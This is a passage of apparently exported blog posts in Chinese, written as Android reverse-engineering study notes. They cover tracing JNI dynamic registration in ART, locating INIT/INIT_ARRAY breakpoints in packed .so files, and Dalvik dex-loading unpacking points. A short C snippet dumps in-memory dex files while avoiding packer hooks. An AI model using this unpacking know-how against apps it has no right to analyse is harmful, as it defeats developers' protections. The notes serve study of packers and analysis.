<img src="/2023/10/21/Dalvik-ART%E4%B8%8B%E5%8A%A8%E6%80%81%E6%B3%A8%E5%86%8C%E5%8E%9F%E7%90%86%E8%BF%BD%E8%B8%AA/image-20231021181032660.png" class="" title="image-20231021181032660">

<blockquote>
<ul>
<li>对于任意一个在Java类中定义的函数而言，它在调用前都会有一个准备的过程。这个过程中会调用LoadClassMembers完成被加载的过程：遍历当前类中的field和函数，将其准备好。</li>
</ul>
<img src="/2023/10/21/Dalvik-ART%E4%B8%8B%E5%8A%A8%E6%80%81%E6%B3%A8%E5%86%8C%E5%8E%9F%E7%90%86%E8%BF%BD%E8%B8%AA/image-20231021180038425.png" class="" title="image-20231021180038425">

<img src="/2023/10/21/Dalvik-ART%E4%B8%8B%E5%8A%A8%E6%80%81%E6%B3%A8%E5%86%8C%E5%8E%9F%E7%90%86%E8%BF%BD%E8%B8%AA/image-20231021180109175.png" class="" title="image-20231021180109175">

<ul>
<li>在这个遍历过程中会准备好每一个函数的ArtMethod对象</li>
<li>只有在准备好了之后才能被调用，不论这个函数是Java还是JNI实现</li>
</ul>
<p>接下来看一下ArtMethod的定义：</p>
<img src="/2023/10/21/Dalvik-ART%E4%B8%8B%E5%8A%A8%E6%80%81%E6%B3%A8%E5%86%8C%E5%8E%9F%E7%90%86%E8%BF%BD%E8%B8%AA/image-20231021180753466.png" class="" title="image-20231021180753466">
</blockquote>
<p>继续之前的<code>JNI::RegisterNativeMethods</code></p>
<img src="/2023/10/21/Dalvik-ART%E4%B8%8B%E5%8A%A8%E6%80%81%E6%B3%A8%E5%86%8C%E5%8E%9F%E7%90%86%E8%BF%BD%E8%B8%AA/image-20231021181500327.png" class="" title="image-20231021181500327">

<ul>
<li>跟进<code>RegisterNative()</code></li>
</ul>
<img src="/2023/10/21/Dalvik-ART%E4%B8%8B%E5%8A%A8%E6%80%81%E6%B3%A8%E5%86%8C%E5%8E%9F%E7%90%86%E8%BF%BD%E8%B8%AA/image-20231021181843637.png" class="" title="image-20231021181843637">

<ul>
<li><p>继续跟进SetEntryPointFromJni()，参数是函数地址</p>
</li>
<li><p>看这个名字我们就能发现他是对于JNI入口地址的绑定</p>
<blockquote>
<p>在<code>art_method.h</code>里面也有关于<code>EntryPointFromJni</code>的定义</p>
<img src="/2023/10/21/Dalvik-ART%E4%B8%8B%E5%8A%A8%E6%80%81%E6%B3%A8%E5%86%8C%E5%8E%9F%E7%90%86%E8%BF%BD%E8%B8%AA/image-20231021182403408.png" class="" title="image-20231021182403408"></blockquote>
</li>
</ul>
<img src="/2023/10/21/Dalvik-ART%E4%B8%8B%E5%8A%A8%E6%80%81%E6%B3%A8%E5%86%8C%E5%8E%9F%E7%90%86%E8%BF%BD%E8%B8%AA/image-20231021182530070.png" class="" title="image-20231021182530070">

<ul>
<li>到这里还可以继续往下分析，<code>SetEntryPointFromJniPtrSize</code>第一个参数是函数地址，第二个参数是运行系统位数</li>
</ul>
<img src="/2023/10/21/Dalvik-ART%E4%B8%8B%E5%8A%A8%E6%80%81%E6%B3%A8%E5%86%8C%E5%8E%9F%E7%90%86%E8%BF%BD%E8%B8%AA/image-20231021223316896.png" class="" title="image-20231021223316896">

<img src="/2023/10/21/Dalvik-ART%E4%B8%8B%E5%8A%A8%E6%80%81%E6%B3%A8%E5%86%8C%E5%8E%9F%E7%90%86%E8%BF%BD%E8%B8%AA/image-20231021223340230.png" class="" title="image-20231021223340230">

<img src="/2023/10/21/Dalvik-ART%E4%B8%8B%E5%8A%A8%E6%80%81%E6%B3%A8%E5%86%8C%E5%8E%9F%E7%90%86%E8%BF%BD%E8%B8%AA/image-20231021223520552.png" class="" title="image-20231021223520552">

<blockquote>
<p><mark><strong>以上就是ART下一个函数的动态注册流程</strong></mark></p>
</blockquote>
<h3 id="修改源码HOOK"><a href="#修改源码HOOK" class="headerlink" title="修改源码HOOK"></a>修改源码HOOK</h3><p>接下来我们在这些流程中添加一些log信息，追踪动态注册的函数</p>
<blockquote>
<ol>
<li>RegisterNatives</li>
<li>RegisterNativeMethods</li>
<li>jint::RegisterNativeMethods</li>
<li>RegisterNative</li>
<li>SetEntryPointFromJni</li>
<li>。。。</li>
</ol>
</blockquote>
<p>通过在这些函数加LOG日志（<code>LOG(WARNING) &lt;&lt; xxx;</code>）的方法将函数的信息都打印出来</p>
<img src="/2023/10/21/Dalvik-ART%E4%B8%8B%E5%8A%A8%E6%80%81%E6%B3%A8%E5%86%8C%E5%8E%9F%E7%90%86%E8%BF%BD%E8%B8%AA/image-20231021210427169.png" class="" title="image-20231021210427169">

<h6 id="修改完源码之后重新编译"><a href="#修改完源码之后重新编译" class="headerlink" title="修改完源码之后重新编译"></a>修改完源码之后重新编译</h6><blockquote>
<p><code>source build/envsetup.sh</code></p>
<p><code>lunch</code>执行后选择要编译的系统版本</p>
<p><code>time make -x</code>多给几个线程编译会快点</p>
</blockquote>
<h6 id="编译完成刷入手机"><a href="#编译完成刷入手机" class="headerlink" title="编译完成刷入手机"></a>编译完成刷入手机</h6><p>在编译的过程中，再来看一下art_method.h中JNI的注册</p>
<img src="/2023/10/21/Dalvik-ART%E4%B8%8B%E5%8A%A8%E6%80%81%E6%B3%A8%E5%86%8C%E5%8E%9F%E7%90%86%E8%BF%BD%E8%B8%AA/image-20231021215743693.png" class="" title="image-20231021215743693">

<ul>
<li>通过注释我们就可以知道JNI函数最终是注册到了这里</li>
<li>不过这个地方在不同系统版本的实现会有所不同，这个我们在HOOK的时候要注意</li>
</ul>
<blockquote>
<p>例如：</p>
<img src="/2023/10/21/Dalvik-ART%E4%B8%8B%E5%8A%A8%E6%80%81%E6%B3%A8%E5%86%8C%E5%8E%9F%E7%90%86%E8%BF%BD%E8%B8%AA/image-20231021215449812.png" class="" title="image-20231021215449812">

<center>android-6.0.1</center>

<img src="/2023/10/21/Dalvik-ART%E4%B8%8B%E5%8A%A8%E6%80%81%E6%B3%A8%E5%86%8C%E5%8E%9F%E7%90%86%E8%BF%BD%E8%B8%AA/image-20231021215608057.png" class="" title="image-20231021215608057">

<center>android-14.0.0_r2</center>
</blockquote>
<h6 id="运行我们的demo"><a href="#运行我们的demo" class="headerlink" title="运行我们的demo"></a>运行我们的demo</h6><img src="/2023/10/21/Dalvik-ART%E4%B8%8B%E5%8A%A8%E6%80%81%E6%B3%A8%E5%86%8C%E5%8E%9F%E7%90%86%E8%BF%BD%E8%B8%AA/image-20231022001832599.png" class="" title="image-20231022001832599">

<blockquote>
<ul>
<li><p>可以看到我们标记的第一部分所有绑定的函数都是同一个函数地址：所以这很可能是一个函数跳转表之类的东西</p>
</li>
<li><p>懒绑定：对于静态函数来说，第一次编译的时候都绑定在了跳转表的地址，第二次调用的时候才从跳转表查询要调用的函数并绑定，等再次调用的时候就不需要重复查询了。</p>
</li>
<li><p>这里面除了标红的onCreate、newObject之外都是静态函数</p>
</li>
<li><p>第二部分是我们动态绑定的函数，地址在我们插入LOG的几个位置都打印出来了，从地址长度可以看出来是运行在64位的设备上</p>
</li>
</ul>
</blockquote>
<h6 id="再拿一个加壳的APP跑一下试试"><a href="#再拿一个加壳的APP跑一下试试" class="headerlink" title="再拿一个加壳的APP跑一下试试"></a>再拿一个加壳的APP跑一下试试</h6><p>执行完过滤一下结果，可以看到加载的函数地址也都打印出来了</p>
<img src="/2023/10/21/Dalvik-ART%E4%B8%8B%E5%8A%A8%E6%80%81%E6%B3%A8%E5%86%8C%E5%8E%9F%E7%90%86%E8%BF%BD%E8%B8%AA/image-20231022161955335.png" class="" title="image-20231022161955335">

<ul>
<li><strong>说明我们HOOK是成功的</strong></li>
<li>但是设备会特别卡，应该在哪里过滤一下会好点</li>
</ul>
<hr>
<h4 id="接下来了解一些so加载过程中，函数执行时机的问题"><a href="#接下来了解一些so加载过程中，函数执行时机的问题" class="headerlink" title="接下来了解一些so加载过程中，函数执行时机的问题"></a>接下来了解一些so加载过程中，函数执行时机的问题</h4><p>在Android里面有两个函数可以加载so文件：</p>
<ul>
<li><code>System.loadLibrary</code>，参数只需要传入文件名即可，它内部会自动拼接文件名</li>
<li><code>System.load</code>，参数需要传入绝对路径</li>
</ul>
<p>在项目中<code>JNI_OnLoad</code>函数是执行比较早的，要早于大部分JNI函数的执行时机</p>
<p>但是在它之前还有两类函数（INIT和INIT_ARRAY）要比它更早执行</p>
<img src="/2023/10/21/Dalvik-ART%E4%B8%8B%E5%8A%A8%E6%80%81%E6%B3%A8%E5%86%8C%E5%8E%9F%E7%90%86%E8%BF%BD%E8%B8%AA/image-20231022183100163.png" class="" title="image-20231022183100163">

<blockquote>
<p><code>INIT_ARRAY</code>默认是按定义的顺序执行，也可以通过给<code>constructor</code>传入参数，手动设置它的执行顺序</p>
<img src="/2023/10/21/Dalvik-ART%E4%B8%8B%E5%8A%A8%E6%80%81%E6%B3%A8%E5%86%8C%E5%8E%9F%E7%90%86%E8%BF%BD%E8%B8%AA/image-20231022185024397.png" class="" title="image-20231022185024397">
</blockquote>
<h6 id="分析编译后生成的apk文件"><a href="#分析编译后生成的apk文件" class="headerlink" title="分析编译后生成的apk文件"></a>分析编译后生成的apk文件</h6><blockquote>
<p>解压apk分析里面的so文件</p>
<p>用Ubuntu自带的readelf工具，可以解析so文件</p>
<pre><code>tom@ubuntu:~/Downloads$ readelf -d libreflectiontest.so 

Dynamic section at offset 0x4bb30 contains 31 entries:
  Tag        Type                         Name/Value
 0x0000000000000001 (NEEDED)             Shared library: [libandroid.so]
 0x0000000000000001 (NEEDED)             Shared library: [liblog.so]
 0x0000000000000001 (NEEDED)             Shared library: [libm.so]
 0x0000000000000001 (NEEDED)             Shared library: [libdl.so]
 0x0000000000000001 (NEEDED)             Shared library: [libc.so]
 0x000000000000000e (SONAME)             Library soname: [libreflectiontest.so]
 0x000000000000001e (FLAGS)              BIND_NOW
 0x000000006ffffffb (FLAGS_1)            Flags: NOW
 0x0000000000000007 (RELA)               0xb880
 0x0000000000000008 (RELASZ)             34992 (bytes)
 0x0000000000000009 (RELAENT)            24 (bytes)
 0x000000006ffffff9 (RELACOUNT)          992
 0x0000000000000017 (JMPREL)             0x14130
 0x0000000000000002 (PLTRELSZ)           3912 (bytes)
 0x0000000000000003 (PLTGOT)             0x4ce38
 0x0000000000000014 (PLTREL)             RELA
 0x0000000000000006 (SYMTAB)             0x2f8
 0x000000000000000b (SYMENT)             24 (bytes)
 0x0000000000000005 (STRTAB)             0x6720
 0x000000000000000a (STRSZ)              20829 (bytes)
 0x000000006ffffef5 (GNU_HASH)           0x4408
 0x0000000000000004 (HASH)               0x5328
 0x0000000000000019 (INIT_ARRAY)         0x4cb10	// 这个是我们定义的INIT_ARRAY函数
 0x000000000000001b (INIT_ARRAYSZ)       32 (bytes)
 0x000000000000001a (FINI_ARRAY)         0x4cb00
 0x000000000000001c (FINI_ARRAYSZ)       16 (bytes)
 0x000000000000000c (INIT)               0x2146c	// 在IDA里面直接可以搜索INIT函数的位置
 0x000000006ffffff0 (VERSYM)             0x3ec8
 0x000000006ffffffe (VERNEED)            0x43c4
 0x000000006fffffff (VERNEEDNUM)         2
 0x0000000000000000 (NULL)               0x0
</code></pre>
<p>在IDA里面按G搜索<code>0x2146c</code>这个地址就可以跳转到INIT函数处</p>
<img src="/2023/10/21/Dalvik-ART%E4%B8%8B%E5%8A%A8%E6%80%81%E6%B3%A8%E5%86%8C%E5%8E%9F%E7%90%86%E8%BF%BD%E8%B8%AA/image-20231022191116590.png" class="" title="image-20231022191116590">

<p>再来搜索一下<code>INIT_ARRAY</code>函数</p>
<img src="/2023/10/21/Dalvik-ART%E4%B8%8B%E5%8A%A8%E6%80%81%E6%B3%A8%E5%86%8C%E5%8E%9F%E7%90%86%E8%BF%BD%E8%B8%AA/image-20231022191938961.png" class="" title="image-20231022191938961">

<ul>
<li><p>这边的几个函数就是我们之前按顺序定义的initarray_3、initarray_2、initarray_1函数</p>
<img src="/2023/10/21/Dalvik-ART%E4%B8%8B%E5%8A%A8%E6%80%81%E6%B3%A8%E5%86%8C%E5%8E%9F%E7%90%86%E8%BF%BD%E8%B8%AA/image-20231022192112073.png" class="" title="image-20231022192112073"></li>
</ul>
</blockquote>
<p>以后我们如果要对一些加壳的SO文件进行分析的时候需要断在_INIT之前就可以用上面这种方法下断点，断下来之后开始动态调试</p>
<p><a href="https://github.com/xiaoeeyu/JNI_method_track">代码地址</a></p>
]]></content>
      <categories>
        <category>NDK开发</category>
      </categories>
      <tags>
        <tag>JNI函数注册原理与追踪</tag>
        <tag>源码修改</tag>
      </tags>
  </entry>
  <entry>
    <title>Dalvik下一代壳的通用解决方案</title>
    <url>/2023/09/04/Dalvik%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E7%9A%84%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</url>
    <content><![CDATA[<p>本节主要分析在Dalvik时代怎么做到把壳脱下来的，通过<strong>Android 4.x</strong>的源码跟踪一下系统帮我们加载dex时候的流程，分析一下脱壳的原理和时机。</p>
<span id="more"></span>

<h2 id="Dalvik下DexClassLoader加载dex源码流程分析"><a href="#Dalvik下DexClassLoader加载dex源码流程分析" class="headerlink" title="Dalvik下DexClassLoader加载dex源码流程分析"></a>Dalvik下DexClassLoader加载dex源码流程分析</h2><p><a href="http://androidxref.com/">源码网址</a></p>
<img src="/2023/09/04/Dalvik%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E7%9A%84%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/541a0875d28a486e802c19d42d9ea07d.png" class="" title="84070f0817edd69f1ec2c8dec32410f7.png">

<p>在libcore中查找DexClassLoader函数</p>
<img src="/2023/09/04/Dalvik%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E7%9A%84%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/6d588821ac6a49788bcfde3cab556277.png" class="" title="ae2cce5b54f6d6992720f5ec5c3d439e.png">

<ul>
<li>可以看到它继承自BaseDexClassLoader()，这个函数里面只有一个构造函数没有太多的内容。接下来继续跟进BaseDexClassLoader()看一下</li>
</ul>
<img src="/2023/09/04/Dalvik%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E7%9A%84%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/79c707843631456e95a9d1a959c228db.png" class="" title="d3591dddf27451ca612f8070f3549efe.png">

<ul>
<li>这个函数功能比较简单，将我们当前的ClassLoader的父节点设置为我们传入的parent，之后new了一个DexPathList()进行初始化，那就跟进去看它传递的参数是什么</li>
</ul>
<img src="/2023/09/04/Dalvik%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E7%9A%84%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/b8f6c7e6e90b465bb0950982972f97d7.png" class="" title="16bd1f55fd61e0502517634e4368eaa5.png">

<ul>
<li><p>DexPathList()的第一个参数是ClassLoader第二个才是我们要加载的DEX文件路径，之后的一些if判断对参数进行了一些校验，可以看到下面的makeDexElements()传入了<strong>dexPath</strong>，我们继续跟踪这个函数看一下</p>
<img src="/2023/09/04/Dalvik%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E7%9A%84%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/e94a843bd81f4706a8f0255d9fe31303.png" class="" title="554171a06d0379744ff5f02742c2cde3.png">

<ul>
<li><p><em>进来之后可以看到它的返回值是一个Element[]数组，在FART当中也会对Element这个匿名内部类有一定涉及，它也在DexPathList类当中进行了定义</em></p>
<img src="/2023/09/04/Dalvik%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E7%9A%84%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/f55c2e61f10a4a4a9ca8a3f50a34456d.png" class="" title="a95612028d79319ecd1e2179060c522c.png">

<img src="/2023/09/04/Dalvik%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E7%9A%84%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/8c008213cf73475982e16ea3210e5366.png" class="" title="0eee385d01e6ef7b46c9f07620f947ad.png">
</li>
<li><p><em>从定义中可以看到它的参数中有包含DexFile对象，接下来还回过头去看makeDexElements()</em></p>
</li>
</ul>
</li>
</ul>
<img src="/2023/09/04/Dalvik%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E7%9A%84%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/a2a5da1a1c20463188e47b214680dd31.png" class="" title="2eef41f4fd99366cc5e1c25e133d7dc2.png">

<ul>
<li>可以看到这里面就调用了LoadDexFile()，在调用完之后再将这个DEX添加到Elements[]数组当中，接下来我们跟进LoadDexFile()去看一下</li>
</ul>
<img src="/2023/09/04/Dalvik%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E7%9A%84%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/f6aa7aefa24a43fbb85fffd6c71ffc8c.png" class="" title="23aac5300998fc787c34492efd88eb6c.png">

<ul>
<li>在LoadDexFile当中再次调用了DexFile类当中的loadDex(<strong>传入了三个参数</strong>)，跟进DexFile类看一下loadDex()</li>
</ul>
<img src="/2023/09/04/Dalvik%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E7%9A%84%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/0b378bde0f6944dc9ac2a0d2aa380b95.png" class="" title="a52a6742c3af6dbc47574810a55b43c1.png">

<ul>
<li>传入的第一个参数是我们跟的dex路径，DexFile的返回值是new了一个DexFile的对象，继续跟进去看一下</li>
</ul>
<img src="/2023/09/04/Dalvik%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E7%9A%84%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/b3ebad68e5804063b2f30bbc6c4a8af7.png" class="" title="8ca1b132811c6067292b19ad1b0b3cef.png">

<ul>
<li>在这里面又调用了openDexFile()来先对DEX进行处理，然后返回mCookie。我们继续跟进看一下</li>
</ul>
<img src="/2023/09/04/Dalvik%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E7%9A%84%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/0b324a89a4134fe8b6d1aec5532f39c0.png" class="" title="29349eb061356eb81db201ff3dd50b17.png">

<ul>
<li>到这里我们看里面调用函数的名字就知道它进入了Native层来处理，是使用C/C++来实现的，再往下等后面学习NDK开发的时候还会涉及到这些。</li>
</ul>
<h3 id="查找CPP源码"><a href="#查找CPP源码" class="headerlink" title="查找CPP源码"></a>查找CPP源码</h3><h4 id="第一种方法"><a href="#第一种方法" class="headerlink" title="第一种方法"></a>第一种方法</h4><p>我们在Android源码当中检索cpp的时候实际上每一个java类他当中的GNI实现是有一个规律的</p>
<img src="/2023/09/04/Dalvik%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E7%9A%84%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/5013afa2630f4d52bb42a6b085afc86e.png" class="" title="8e17976db0b4b23f45049cd0bd1f5af9.png">

<ul>
<li>比如说我们当前的类在，dalvik/system/DexFile.java中，那么它对应的cpp实现就在<strong>dalvik_system_DexFile</strong>中，就是把路径用下划线分割的CPP文件名</li>
</ul>
<img src="/2023/09/04/Dalvik%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E7%9A%84%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/2c3931c242ea4a2d90d6b58ac8a75b45.png" class="" title="3fa2e1ab0529ad7ebbe20899316e7f09.png">

<ul>
<li>我们就可以在dalvik下面找到这个cpp文件，要打开这个文件我们只需要去这个路径下面去就可以了</li>
</ul>
<img src="/2023/09/04/Dalvik%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E7%9A%84%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/6078b8cc85a04fe39e3cbdaf3e84db49.png" class="" title="fc32fc3530b9f503f9b7607af8852165.png">

<h4 id="第二种方法"><a href="#第二种方法" class="headerlink" title="第二种方法"></a>第二种方法</h4><p>直接在dalvik()中检索这个函数名</p>
<img src="/2023/09/04/Dalvik%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E7%9A%84%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/4be8759a925b48be9ea1acb4b1eb1243.png" class="" title="5b7d470877b7244818b59ee8a6a04ccf.png">

<p><strong>找到了CPP</strong><br>进来这个函数之后</p>
<img src="/2023/09/04/Dalvik%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E7%9A%84%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/4b9efd34274c4aa9b183d2a3d48b9190.png" class="" title="1d6c912b06c33b73efe93f9b675e7baf.png">

<ul>
<li>进来之后会先对当前文件进行一个校验判断是否是**.dex**后缀，校验通过了再进入dvmRawDexFileOpen()进行加载。跟进去看一下</li>
</ul>
<img src="/2023/09/04/Dalvik%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E7%9A%84%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/bb5d578d69c14246a7f3d2db34cfcbc0.png" class="" title="d580fbb8e5c68783f64b376e0f7c0bc4.png">

<ul>
<li>进来之后这个函数比较长，它先执行了一些魔术头校验、设置文件优化后路径等操作，我们先继续跟进看一下这个文件优化<strong>dvmOptimizeDexFile()</strong></li>
</ul>
<img src="/2023/09/04/Dalvik%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E7%9A%84%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/13893ad99cfd439d9d46825246e47172.png" class="" title="1f694562790afb6698189f114e44b096.png">

<ul>
<li><p>这个函数也比较长，但是它的主要作用就是调用**/bin/dexopt<strong>生成优化后的</strong>odex**文件然后返回，下面我们去分析一下dexopt的源码</p>
<ul>
<li>寻找<a href="http://androidxref.com/4.4.4_r1/xref/dalvik/dexopt/">dexopt</a></li>
</ul>
</li>
</ul>
<img src="/2023/09/04/Dalvik%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E7%9A%84%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/289809c3fcce46b49d86cae224869386.png" class="" title="1bc16591b10061e28d4aac33db9f381b.png">

<img src="/2023/09/04/Dalvik%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E7%9A%84%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/96cd7202d89848a8b833f43f144d48b4.png" class="" title="d9d73b9e09ea02e2866d8aff953cf75b.png">

<ul>
<li>进来之后main()函数会先看我们传入的是什么文件，如果是<strong>dex</strong>文件就执行fromDex()。继续跟进去看一下</li>
</ul>
<img src="/2023/09/04/Dalvik%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E7%9A%84%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/9f78499abb2246af9d3b7fe144a321b3.png" class="" title="eda1c3a92f7ceec9286e08956df9b63b.png">

<ul>
<li>进来之后先进行了一系列的优化前的准备，准备完成的话就开始调用**dvmContinueOptimization()**方法进行优化。继续跟进</li>
</ul>
<img src="/2023/09/04/Dalvik%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E7%9A%84%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/ccce026a5d9d4129874367ba28d92307.png" class="" title="a0b7acd35030831bc11625290b183d24.png">

<ul>
<li><ul>
<li><p>进来之后呢，会将dex文件映射到内存，然后对文件进行一个重写。我们先跟进去看rewriteDex()是怎么重写的</p>
<img src="/2023/09/04/Dalvik%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E7%9A%84%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/2be6a2e843f9499093c2ccc7be071239.png" class="" title="49f03c85b0ab7c60f1c645f5d0f40f13.png">

<ul>
<li>进来这个地方内存地址和长度都有了已经可以当作一个脱壳点了，再跟进去看里面还有什么</li>
</ul>
<img src="/2023/09/04/Dalvik%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E7%9A%84%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/ba015ce7934b467ca020e0d84f83b2e4.png" class="" title="d386429d3843a0f30a95e84025bd0dc6.png">

<ul>
<li>进去之后这里也包含有起始地址和长度</li>
</ul>
<h3 id="Dalvik下通用脱壳方案"><a href="#Dalvik下通用脱壳方案" class="headerlink" title="Dalvik下通用脱壳方案"></a>Dalvik下通用脱壳方案</h3><ul>
<li><p>在Dalvik下有很多的通用脱壳教程就是对dexFileParse()、dvmDexFileOpenPartial()这两个函数下断点或者进行hook然后取出第一个和第二个参数</p>
</li>
<li><p>第一个参数就是要dump的起始地址，第二个参数就是要dump的内存区域的长度</p>
</li>
<li><p>不过在这个版本的源码中可以脱壳的地方是非常多的不止这两个地方</p>
<ol>
<li><p>比如前面用mmap()将dex文件映射到内存的地方如果对这个映射区域进行dump，就可以把从文件加载的dex给dump出来</p>
<img src="/2023/09/04/Dalvik%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E7%9A%84%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/688bcd18cda143d288bdb5befbf92172.png" class="" title="34a83212500e7f8a1382298bf5f2836c.png">
</li>
<li><p>还有包括这个地方也有内存中dex的起始地址和大小</p>
<img src="/2023/09/04/Dalvik%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E7%9A%84%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/6e86b9e723994230a787bea30e8b6887.png" class="" title="3019e6a8d570d7a75c5e19a44cddcf4d.png">
</li>
<li><p>另外进去这个rewriteDex()内部，它里面也有可以dex的起始地址和大小都可以dump下来</p>
<img src="/2023/09/04/Dalvik%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E7%9A%84%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/63e1f836d04b4287bf78de4ebef824f3.png" class="" title="ba9b9aba9565573ea17ac1939b8b4098.png"></li>
</ol>
<ul>
<li>这样看下来可以用的脱壳点还是挺多的，然后尝试手动实现一下</li>
<li>实现的方式也有很多种选择：比如可以通过hook的形式（cydia、xposed、frida等等）都可以实现对关键函数的一个hook，这种方式在后面搞xposed框架写插件的时候再尝试</li>
<li>这次我们就简单的把它当作C/C++函数在里面添加几行代码把dex文件dump出来，使用这种方式我们需要对系统源码进行一个修改定制</li>
</ul>
</li>
</ul>
<p>因为这种脱壳方式比较老了对一些变种壳可能也没有很好的作用，下面只写一下代码学习一下原理，就不拿设备实测了</p>
<pre><code class="C">    char dexfilepath[100]={0};
    int pid=getpid();
    sprintf(dexfilepath,"/sdcard/%d_%d_dvmDexFileOpenPartial.dex",len,pid); // 拼接一个保存的路径
    //fopen
    int fd=open(dexfilepath,O_CREAT|O_RDWR,0666);   // 因为很多壳都会把fopen()这些标准的C函数给hook掉，所以我们使用open()来打开文件避免使用标准读写文件函数
                                                    // 给一个合适的文件读写权限
    if(fd&gt;0)
    {
        write(fd,addr,len);
        close(fd);
    }
</code></pre>
<img src="/2023/09/04/Dalvik%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E7%9A%84%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/ac9d2c8c4908415bbb602018631e792b.png" class="" title="f319eaaf42620335ab537f4e373b096a.png"></li>
</ul>
</li>
</ul>
<p><strong>下载对应的Android源码，修改脱壳点处的代码重新编译源码刷入设备即可。</strong></p>
]]></content>
      <categories>
        <category>Android逆向</category>
      </categories>
      <tags>
        <tag>Android脱壳</tag>
        <tag>学习笔记</tag>
        <tag>Android源码分析</tag>
      </tags>
  </entry>
  <entry>
    <title>FART中的脱壳点-脱壳组件</title>
    <url>/2023/09/26/FART%E4%B8%AD%E7%9A%84%E8%84%B1%E5%A3%B3%E7%82%B9-%E8%84%B1%E5%A3%B3%E7%BB%84%E4%BB%B6/</url>
    <content><![CDATA[<p>上一章对Dalvik和ART下的函数抽取方案进行了分析，本章开始FART框架的解析——本章主要解析FART框架中的脱壳组件</p>
<span id="more"></span>

<h2 id="FART框架"><a href="#FART框架" class="headerlink" title="FART框架"></a>FART框架</h2><h3 id="框架构成"><a href="#框架构成" class="headerlink" title="框架构成"></a>框架构成</h3><img src="/2023/09/26/FART%E4%B8%AD%E7%9A%84%E8%84%B1%E5%A3%B3%E7%82%B9-%E8%84%B1%E5%A3%B3%E7%BB%84%E4%BB%B6/image-20230926111338303.png" class="" title="image-20230926111338303">

<ul>
<li><p>框架分为三个组件：</p>
<p>脱壳组件：脱壳组件可以把dex的整体结构性内容脱下来，如果是函数抽取类型的壳脱下来的函数体是空的</p>
